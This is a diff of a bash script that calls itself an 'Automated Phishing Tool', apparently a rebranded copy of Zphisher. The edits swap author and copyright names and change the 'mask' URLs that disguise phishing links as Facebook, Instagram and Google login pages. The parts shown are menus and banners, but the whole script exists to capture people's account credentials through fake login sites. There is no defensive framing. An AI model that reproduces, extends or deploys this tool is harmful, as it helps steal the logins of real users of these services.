@@ -1,8 +1,11 @@
 #!/bin/bash
-##   NavinFisher 	: 	Automated Phishing Tool
-##   Author 		:   Navin Sharma 
-##   Version 		: 	2.3.2
-##   Github 		: 	https://github.com/NavinSha1801/NavinFisher.git
+
+##   Zphisher 	: 	Automated Phishing Tool
+##   Author 	: 	NAVIN SHARMA 
+##   Version 	: 	2.3.2
+##   Github 	: 	https://github.com/NavinSha1801/NavinFisher.git
+
+
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
@@ -73,15 +76,19 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/NavinSha1801)
+##      Copyright (C) 2022  GAMENOSHAME (https://github.com/NavinSha1801)
 ##
+
+
 __version__="2.3.2"
+
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
+
 ## Directories
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
@@ -138,7 +145,6 @@ kill_pid() {
 	done
 }
 
-## ${ORANGE}      |_|                ${RED}Version : ${__version__}
 ## Banner
 banner() {
 	cat <<- EOF
@@ -168,7 +174,6 @@ banner_small() {
 		                                                                                 ${CYAN} ${__version__}
 	EOF
 }
-
 
 ## Dependencies
 dependencies() {
@@ -313,7 +318,7 @@ about() {
 	cat <<- EOF
 		${GREEN} Author   ${RED}:  ${ORANGE}NAVIN SHARMA ${RED}[ ${ORANGE}GAMENOSHAME ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/NavinSha1801/NavinFisher.git
-        ${GREEN} Social   ${RED}:  ${CYAN}Navin Sharma
+		${GREEN} Social   ${RED}:  ${CYAN}Navin Sharma
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -556,19 +561,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://facebook.com/login'
+			mask='http://Facebook.com'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://facebook.com/login'
+			mask='http://Facebook.com'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://facebook.com/login'
+			mask='http://facebook.com'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://facebook.com/login'
+			mask='http://facebook.com'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -592,19 +597,19 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='http://instagram.com/login'
+			mask='http://instagram.com'
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='http://instagram.com/login'
+			mask='http://instagram.com'
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
-			mask='http://instagram.com/login'
+			mask='http://instagram.com'
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
-			mask='http://instagram.com/login'
+			mask='http://instagram.com'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -627,15 +632,15 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='http://google.com/login'
+			mask='http://google.com'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='http://google.com/new_account'
+			mask='http://google.com'
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
-			mask='http://google.com/account_pool'
+			mask='http://google.com'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
